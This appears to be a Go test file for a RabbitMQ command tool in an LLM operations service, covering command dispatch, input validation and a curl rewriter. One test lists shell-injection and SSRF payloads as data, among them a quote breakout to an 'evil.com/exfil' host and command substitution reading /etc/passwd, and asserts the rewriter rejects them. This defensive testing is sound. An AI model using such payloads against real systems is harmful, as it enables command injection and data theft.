package tools

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"nudgebee/llm/config"
	"nudgebee/llm/security"
	"nudgebee/llm/tools/core"
)

// TestRabbitExecute_Dispatch pins rabbit_execute's dispatch choice:
//
//   - `rabbitmqadmin ...` → workspace shell (both binaries are shimmed there)
//   - `rabbitmq-api ...`  → workspace shell (also shimmed via PR #35005)
//   - `curl ... /api/...` → CARVE-OUT to relay direct (curl is NOT shimmed in
//     the workspace pod; running it there means no $RABBITMQ_HOST/creds — the
//     silent-fail PR #34906 stopgap-fixed and which we preserve back-compat
//     for here by dispatching such commands via ExecuteContainerJob).
//
// We can't mock the workspace manager without adding an interface layer, so
// the observable used here is whether the captured relay endpoint sees a
// request: relay-hit ⇔ carve-out fired; relay-miss ⇔ workspace path chosen.
// The tool-response error path is ignored (workspace API is unreachable in
// tests — expected).
func TestRabbitExecute_Dispatch(t *testing.T) {
	cases := []struct {
		name      string
		args      string
		wantRelay bool // true → carve-out to relay; false → workspace shell
	}{
		{
			name:      "rabbitmqadmin goes to workspace shell (shimmed there)",
			args:      "list queues",
			wantRelay: false,
		},
		{
			name:      "rabbitmq-api goes to workspace shell (shimmed via PR #35005)",
			args:      "rabbitmq-api GET /api/overview",
			wantRelay: false,
		},
		{
			name:      "curl + /api/ carveout dispatches to relay direct",
			args:      "curl http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview",
			wantRelay: true,
		},
		{
			name:      "curl + /api/ carveout fires even inside a pipeline",
			args:      "curl http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview | jq '.message_stats'",
			wantRelay: true,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			relayCalled := false
			toolCtx := newRabbitTestContext(t, "prod", func(_ string) { relayCalled = true })
			// Ignore the tool response — the workspace path fails in tests
			// because the workspace API isn't reachable; we're only checking
			// the DISPATCH choice, not the downstream outcome.
			_, _ = RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{
				Arguments: map[string]any{"args": tc.args},
			})
			if tc.wantRelay {
				assert.True(t, relayCalled,
					"curl carve-out MUST dispatch to relay directly — otherwise curl in workspace runs locally with no $RABBITMQ_HOST/creds (the PR #34906 silent-fail we're preserving back-compat for)")
			} else {
				assert.False(t, relayCalled,
					"non-curl commands MUST route to workspace shell (via ExecuteOrLazyCreate) to enable Kind-B chaining into /workspace/*; dispatching to relay bypasses the workspace shell")
			}
		})
	}
}

// TestRabbitExecute_ValidationErrors covers the input-validation branches
// that must fail BEFORE the relay is contacted. Guards against a
// regression where an empty tool config or missing args would silently
// dispatch to the customer environment.
func TestRabbitExecute_ValidationErrors(t *testing.T) {
	t.Run("missing tool config errors before any relay call", func(t *testing.T) {
		relayCalled := false
		toolCtx := newRabbitTestContext(t, "", func(_ string) { relayCalled = true })

		_, err := RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{
			Arguments: map[string]any{"args": "list queues"},
		})

		require.Error(t, err)
		assert.Contains(t, err.Error(), "no tool configs found")
		assert.False(t, relayCalled, "relay must NOT be called when tool config is missing")
	})

	t.Run("missing args errors before any relay call", func(t *testing.T) {
		relayCalled := false
		toolCtx := newRabbitTestContext(t, "prod", func(_ string) { relayCalled = true })

		_, err := RabbitExecuteTool{}.Call(toolCtx, core.NBToolCallRequest{
			Arguments: map[string]any{"instance": "prod"},
		})

		require.Error(t, err)
		assert.Contains(t, err.Error(), "missing 'args' parameter")
		assert.False(t, relayCalled, "relay must NOT be called when args is empty")
	})
}

// TestRewriteRabbitmqAPICommand_LLMServer mirrors the relay-server test suite
// for the twin implementation. The two rewriters (this one in llm-server's
// common_relay.go, its twin in collector-server/.../workspace.go) MUST accept
// the same input surface and produce equivalent curl strings — otherwise the
// direct-tool path and the workspace-shim path would diverge and confuse
// operators debugging a failing invocation.
func TestRewriteRabbitmqAPICommand_LLMServer(t *testing.T) {
	t.Run("simple GET", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET /api/overview")
		require.NoError(t, err)
		assert.Equal(t,
			`curl -s -X GET -u "$RABBITMQ_USER:$RABBITMQ_PASSWORD" "http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview"`,
			got)
	})

	t.Run("host/port refs are hard-locked (SSRF scope-lock)", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET /api/overview")
		require.NoError(t, err)
		assert.Contains(t, got, `"http://$RABBITMQ_HOST:$RABBITMQ_PORT`,
			"URL host/port must be shell env refs, not literals — otherwise the shim becomes an SSRF gadget")
	})

	t.Run("rejects unsupported HTTP method", func(t *testing.T) {
		_, err := rewriteRabbitmqAPICommand("rabbitmq-api CONNECT /api/overview")
		require.Error(t, err)
		assert.Contains(t, err.Error(), "unsupported HTTP method")
	})

	t.Run("path allowlist blocks quote-breakout injection", func(t *testing.T) {
		// Mirrors the SSRF/injection surface pinned in
		// relay-server workspace_rabbitmq_api_test.go — the two allowlist
		// implementations must reject the same input class or the direct-tool
		// path becomes exploitable while the shim path is safe (or vice versa).
		for _, hostilePath := range []string{
			`/api/x" http://evil.com/exfil "`,
			`/api/x$(cat /etc/passwd)`,
			"/api/x`cat /etc/passwd`",
			`/api/x$SOME_SECRET`,
			`/api/x\`,
		} {
			t.Run(hostilePath, func(t *testing.T) {
				_, err := rewriteRabbitmqAPICommand("rabbitmq-api GET " + hostilePath)
				require.Errorf(t, err, "path %q must be rejected", hostilePath)
				assert.Contains(t, err.Error(), "outside the safe URL-path allowlist")
			})
		}
	})

	t.Run("URL-encoded vhost and query strings pass through", func(t *testing.T) {
		for _, safePath := range []string{
			`/api/queues/%2F/my_queue`,
			`/api/queues?columns=name,messages`,
			`/api/nodes/rabbit@host-1.example.com`,
		} {
			t.Run(safePath, func(t *testing.T) {
				got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET " + safePath)
				require.NoError(t, err, "quote-safe URL-legal path %q must pass", safePath)
				assert.Contains(t, got, safePath)
			})
		}
	})

	t.Run("extra args (JSON body, headers) pass through unchanged", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand(`rabbitmq-api PUT /api/policies/%2F/foo -d '{"a":1}' -H "x: y"`)
		require.NoError(t, err)
		assert.Contains(t, got, `-X PUT`)
		assert.Contains(t, got, `-d '{"a":1}'`)
		assert.Contains(t, got, `-H "x: y"`)
	})
}

// newRabbitTestContext builds a valid NbToolContext pointing at an
// httptest relay that invokes onCommand with the captured command string
// and returns a minimal success envelope. The server is closed on t.Cleanup.
func newRabbitTestContext(t *testing.T, toolConfigName string, onCommand func(string)) core.NbToolContext {
	t.Helper()

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var req map[string]any
		_ = json.Unmarshal(body, &req)
		if bodyMap, ok := req["body"].(map[string]any); ok {
			if params, ok := bodyMap["action_params"].(map[string]any); ok {
				if cmd, ok := params["command"].(string); ok {
					onCommand(cmd)
				}
			}
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"data": map[string]any{"response": "ok", "exit_code": 0},
		})
	}))
	t.Cleanup(srv.Close)

	origEndpoint := config.Config.RelayServerEndpoint
	config.Config.RelayServerEndpoint = srv.URL
	t.Cleanup(func() { config.Config.RelayServerEndpoint = origEndpoint })

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	secCtx := security.NewSecurityContextForSuperAdmin()
	reqCtx := security.NewRequestContext(context.Background(), secCtx, logger, nil, nil)

	return core.NbToolContext{
		AccountId: "test-account",
		Ctx:       reqCtx,
		ToolConfig: core.ToolConfig{
			Name: toolConfigName,
			Values: []core.ToolConfigValue{
				{Name: "k8s_secret", Value: "default/rabbitmq-secret"},
			},
		},
	}
}
